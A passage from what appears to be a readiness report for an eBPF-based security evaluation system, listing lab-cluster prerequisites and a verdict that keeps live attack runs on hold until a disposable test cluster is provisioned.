| **Kubernetes Cluster** | Disposable Cluster Endpoint | Minikube, KinD, or Lab EKS cluster | **NOT READY (Cluster Offline)** |
| **Kernel / eBPF** | Linux Kernel 5.15+ & BTF CO-RE | `/sys/kernel/btf/vmlinux` available on worker nodes | **BLOCKED (Requires Live Cluster)** |
| **PHANTOM Daemons** | API Gateway & eBPF DaemonSet | Running in cluster, scraping eBPF probes | **BLOCKED (Requires Live Cluster)** |
| **Telemetry & Baselines** | Prometheus & Falco | Metrics scrapers and Falco JSONL event logging active | **BLOCKED (Requires Live Cluster)** |
| **Test Sinks** | Internal Mock Sinks | `phantom-sink.phantom-eval.svc.cluster.local` (ports 8443, 4445, 4446, 8080) | **BLOCKED (Requires Live Cluster)** |

### 7.2 Execution Verdict

- **Code, Tooling, Safety Gates, & Campaign Configuration: GO**
  All software preflights, scenario definitions, decoupled ground truth, positive context identification, sink restrictions, and campaign selectors are fully implemented, verified, and protected by unit and integration tests.

- **Live Attack Launch: NO-GO**
  Execution against a live cluster is strictly held until a dedicated disposable lab cluster (Minikube, KinD, or disposable EKS) is provisioned and verified against the checklist above. Under no circumstances should `--execute` be run without an active, verified lab environment.

